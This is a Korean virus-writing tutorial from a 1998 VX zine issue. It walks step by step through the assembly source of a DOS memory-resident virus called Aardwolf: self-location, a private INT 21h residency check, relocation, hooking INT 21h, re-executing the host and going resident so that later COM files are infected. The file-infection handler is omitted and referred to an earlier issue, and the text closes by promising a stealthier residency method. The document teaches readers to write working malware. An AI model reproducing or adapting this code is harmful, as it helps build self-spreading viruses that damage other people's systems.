
  상주형 바이러스 강좌 2 회 - 표준상주                           CVC #04  98/05

-------------------------------------------------------------------------> Crom

  CVC #03 에서는 IVT 에 상주하는 바이러스에 대한 설명을 했었다. 하지만, IVT 에
상주할 경우 바이러스 길이가 제약받는 단점이 있다. 여기서는 예루살렘 형식의 바
이러스에서 사용하던 도스표준명령을 사용해서 상주하는 바이러스에 대해 설명하겠다

  Aardwolf 바이러스 작동법은 다음과 같다.

  1. 바이러스 시작점 구하기
  2. 바이러스 상주여부 검사
  3. 재실행을 위한 PSP 값 저장
  4. 메모리 재배치
  5. 인터럽트 가로채기
  6. 메모리 조정
  7. 실행할 파일 이름 구하기
  8. 프로그램 실행
  9. 메모리 해제
 10. 기억장소에 상주하기


            .286
            .MODEL  TINY
            .CODE

 PARASIZE   EQU  (End_Memory - Aardwolf + 0Fh) SHR 4 + 10h

  이 바이러스는 286 코드를 사용한다.
  PARASIZE 는 기억장소에 상주할때 이 바이러스의 크기이다. +0Fh 는 16의 배수로
만들기 위함이며 SHR 4 (2^4=16) 는 바이러스 크기를 파라그래프 단위로 바꾸는 것
이고 +10h 는 256 바이트 PSP 의 파라그래프 크기이다.


  1. 바이러스 시작점 구하기

            call  Get_Ip
 Get_Ip:    pop   si
            sub   si,0003                   ; 바이러스가 시작되는 위치 얻기

  이해를 돕기 위해서 설명하겠다.

-p

AX=0000  BX=0000  CX=01C3  DX=0000  SP=FFFC  BP=0000  SI=0000  DI=0000
DS=10DC  ES=10DC  SS=10DC  CS=10DC  IP=0103   NV UP EI PL NZ NA PO NC
10DC:0103 5E            POP     SI
-dfff0
10DC:FFF0  5E 30 E4 03 00 00 03 01-DC 10 BC 08 03 01 00 00   ^0..............
                                               ^^^^^
                                             리턴될 주소값

  POP SI 후 SP 값이 + 2 가 되었다.
  CALL 명령후 돌아올 주소값은 스택에 저장되어 있는데 이 값을 SI 에 가져 오게
되었다. 바이러스가 어디에서 시작되어도 이 값에 -3 을 하면 바이러스의 시작위치
를 얻을 수 있다.
AX=0000  BX=0000  CX=01C3  DX=0000  SP=FFFE  BP=0000  SI=0103  DI=0000
                                       ^^^^              ^^^^
                                                   주소값이 SI 에 들어간다.
DS=10DC  ES=10DC  SS=10DC  CS=10DC  IP=0104   NV UP EI PL NZ NA PO NC


10DC:0104 83EE03        SUB     SI,+03       --> SI 는 100h 가 된다. 즉, 바이
                                                 로스가 시작되는 주소이다.


  2. 바이러스 상주 여부 검사


            mov   ax,0f1f1h                 ; 상주 여부 검사
            int   21h
            cmp   ax,0f2f2h
            jnz   Resident
                                            ; 기억장소에 바이러스가 존재하면
            add   si, offset Buffer         ; 원래 COM 의 앞부분 복구
            mov   di, 100h
            movsw
            movsw
            mov   ax,100h
            push  ax
            ret

  F1F1h 는 도스에서 사용하는 시스템콜은 아니다. 만약 바이러스가 상주해 있지 않
으면 도스가 AX 에 F100h 를 돌려준다. 바이러스가 존재하면 AX 로 F2F2h 를 돌려준
다. 바이러스가 기억장소에 상주해 있다면 4 바이트를 복구 한 후 원래 프로그램을
실행시킨다.

  3. 재실행을 위한 PSP 값 저장

            mov   PSP1[SI], ds              ; 재실행을 위해서 PSP 저장
            mov   PSP2[SI], ds
            mov   PSP3[SI], ds


  프로그램을 실행하기 위해서는 필요한 값이 요소가 있다. 그중 재배치 이전의 COM
이 나 EXE 의 DS,ES 값이 필요하다.


  4. 메모리 재배치

            mov   ax, es                    ; 세그먼트를 바꾼다.
            add   ax,0010h
            mov   es,ax
            push  es
            mov   ax, offset New_CS
            push  ax

            mov   cx, offset End_virus      ; 바이러스 복사
            xor   di, di
            repz  movsb
            retf

  세그먼트를 바꾸는 것은 바이러스가 0 으로 재배치 하기 위해서 이다. 이 바이러
스는 시작이 0 이라는 가정에서 제작되었다. COM 파일의 경우 100h 부터 시작되므로
이 값을 보정하기 위해서 세그먼트를 변경한다. SI 에는 이미 바이러스 시작점이므
로 +10 된 ES 세그먼트로 바이러스를 복사 한후 점프한다.


 5. 인터럽트 가로채기

 New_CS:
            push  cs                        ; CS=SS
            pop   ss
            mov   sp, offset End_Memory     ; 스택 조정

            push  cs                        ; Int 21h 주소 얻기
            pop   ds
            mov   ax, 3521h
            int   21h

            mov   word ptr OldInt21,BX
            mov   word ptr OldInt21[2],ES

            mov   ax, 2521h                 ; Int 21h 주소 저장
            push  cs
            pop   es
            mov   dx, offset NewInt21Handler
            int   21h

  스택을 조정하는건 나중에 메모리 크기를 줄일때 충돌이 나지 않기 위해서이다.
  이 바이러스에서는 인터럽트 21h 를 가로채기 위해서 도스에서 제공하는 기능을 사
용하였다. 자세한 내용은 인터럽트 리스트를 참고 하기 바란다.



  6. 메모리 조정

            mov   ah, 4ah                   ; 메모리 조정
            mov   bx, PARASIZE
            mov   es, PSP1
            int   21h

  ES 에는 바이러스 실행 때 사용된 PSP 가 필요하다. 바이러스가 필요한 만큼의 메
모리만 으로 조정한다.


  7. 실행할 파일 이름 구하기

            call  Set_env                   ; 실행 파일 이름 얻기

 Set_Env    proc  near

 Search_RD:                                 ; 재실행을 위한 정보를 얻어 낸다.
            xor   si,si
            mov   ax, PSP1
            mov   ds,ax
            mov   ds,ds:[002Ch]             ; 실행시킨 파일의 이름을 알아낸다.

 Search_RD_LOOP:
            cmp   word ptr DS:[SI],0000     ; 파일이름전에는 0000이다.
            jz    Get_FileName              ; PSP:[002Ch] --> 세그먼트
            inc   si
            jmp   Search_RD_LOOP

 Get_FileName:
            add   si,0004
            mov   dx,si                     ; 현재 실행되는 파일이름
            ret
 Set_env    endp

  PSP 의 002Ch 는 환경영역 세그먼트 주소값이다. 환경영역에는 경로, COMMAND.COM
위치, 윈도우시작위치 등의 정보를 담고 있으며 실행된 파일 이름에 대한 정보도 가
지고 있다. 파일 이름은 0000 으로 끝난 내용에 +4 를 하면된다. 실행을 위해서 DS:
DX 에 파일 이름이 위치 하므로 DS 에는 환경영역세그먼트 DS 에는 오프셋 주소가 들
어 가야 한다.


  8. 프로그램 실행

            push  cs
            pop   es

            mov   ax, 4b00h                 ; 원래 프로그램 실행
            mov   bx, offset Env_Block
            call  Call_Int21

  ES:BX 는 실행을 위한 환경블럭을 가지고 있어야 한다. 현재 환경블럭은 바이러스
내부에 있으므로 push cs, pop es 로 세그먼트를 통일 시킨다.

  정상적인 상태라면 감염된 파일이 재실행된다. 다시 1 번부터 시작되는데 기억장소
에 바이러스가 존재하므로 원래 프로그램을 실행하고 종료하게된다. 다시 바이러스에
게로 제어권이 넘어온다.


  9. 메모리 해제

            push  ds
            pop   es

            mov   ah, 49h                   ; 메모리 해제
            int   21h

  실행을 위해서 할당 되었던 메모리를 해제한다.



 10. 기억장소에 상주하기

            mov   ah, 31h                   ; 원래 프로그램 실행후 기억장소
            mov   dx, Parasize              ; 에 바이러스 상주함
            int   21h

  기억장소에 바이러스를 상주시킨다. 다음 부터 실행되는 COM 파일은 바이러스에 감
염된다.

  여기서는 인터럽트 21h 에 대해서는 설명하지 않았다. C_Tiny 바이러스와 큰 차이
가 없기 때문에 여기서 생략한다. 자세한 내용은 CVC #03 (CVL #03) 을 참고 하기 바
란다.


  다음 호에서는 가장 많은 VX 들이 기대하는 비표준상주방식에 대해서 설명하겠다.
  이미 Miny3 신버전을 제작해 두었다. 비표준상주방식을 사용하는 방법은 크게 두가
  지가있는데 과거의 방법을 사용하면 Upper Memory 가 0 가 되어 버리는 버그와 KOV
  님이 사용하시던 방법의 경우 윈도우 95 도스창에서는 작동하지 않는 문제점이 있
  는데 이런 문제점을 모두 해결한 버전이다.

  문제점을 정리하면 크게 다음과 같다.

  1. Upper Memory 가 0 로 되는 문제
  2. 윈도우 95 도스창에서 상주 하지 않는 문제


